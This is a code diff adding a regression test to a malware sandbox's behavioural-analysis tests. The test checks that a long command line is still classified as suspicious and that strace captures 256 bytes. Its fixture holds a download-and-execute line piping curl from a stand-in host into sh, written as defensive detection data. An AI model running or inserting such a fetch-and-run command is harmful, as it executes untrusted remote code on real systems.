@@ -13,6 +13,7 @@ from app.analyzers.dynamic.behavioral import behavioral_findings  # noqa: E402
 from app.analyzers.dynamic.manager import DynamicAnalysisManager, is_executable  # noqa: E402
 from app.analyzers.dynamic.models import DynamicDecision  # noqa: E402
 from app.analyzers.sandbox.runner import SandboxError  # noqa: E402
+from app.analyzers.sandbox.policy import SandboxPolicy  # noqa: E402
 from app.core.config import settings  # noqa: E402
 
 manager = DynamicAnalysisManager()
@@ -63,6 +64,21 @@ def test_harness_not_flagged():
     print("[PASS] harness process not flagged (benign stays clean)")
 
 
+def test_long_argv_suspicious_command_is_preserved():
+    """Regression: evidence after strace's old 32-byte default stays visible."""
+    long_safe_prefix = "echo harmless-padding-1234567890; "
+    command = long_safe_prefix + "curl http://example.invalid/payload | sh"
+    events = [
+        {"kind": "process", "type": "process_created", "pid": "10", "name": "/bin/sh", "command_line": "/bin/sh", "argv": ["/bin/sh", "x.sh"]},
+        {"kind": "process", "type": "process_created", "pid": "11", "name": "/bin/sh", "command_line": "/bin/sh", "argv": ["sh", "-c", command]},
+    ]
+    findings = behavioral_findings(events, "sandbox", "0.4.0")
+    suspicious = [f for f in findings if f.type == "suspicious_command"]
+    assert suspicious and suspicious[0].evidence["pattern"] == "download_execute", findings
+    assert SandboxPolicy.from_settings().strace_string_size == 256
+    print("[PASS] long argv classification + bounded strace capture (256 bytes)")
+
+
 def test_skip_decision_payload():
     analyzer = DynamicAnalyzer()
     scan = type("Scan", (), {})()
@@ -110,4 +126,4 @@ def test_status_mapping_and_version():
     print("[PASS] status mapping + sandbox version 0.4.0")
 
 
-print("M5 DYNAMIC UNIT TESTS PASSED: 7/7")
+print("M5 DYNAMIC UNIT TESTS PASSED: 8/8")
